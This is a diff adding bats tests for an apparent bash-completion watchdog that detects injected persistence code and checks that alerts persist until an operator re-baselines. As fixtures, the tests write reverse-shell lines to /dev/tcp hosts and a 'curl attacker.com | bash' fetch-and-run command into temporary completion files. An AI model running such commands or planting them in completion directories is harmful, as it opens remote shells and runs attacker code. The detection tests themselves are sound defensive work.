@@ -184,3 +184,53 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-bash-completion -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): bash-completion-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # T1546 per-bash-login source surface — injection alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/mytool"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"bash_completion_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered from completion file body)" {
+    # bash-completion files are bash; # comments. Operator notes about
+    # hypothetical attack patterns must NOT trigger alert.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/bash\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
+    run_wd
+    ! cap | grep -q '"event":"bash_completion_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/bash_completion.d + /usr/share/bash-completion/completions + XDG axes — injection in ANY → alert)" {
+    # bash-completion sources from multiple dirs (system + user + XDG).
+    # Attacker may plant in any. Lock multi-dir axis.
+    HOOKD2="${TMP}/bash-completion-completions"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in the second dir.
+    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-completion"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/bash\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/mytool"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
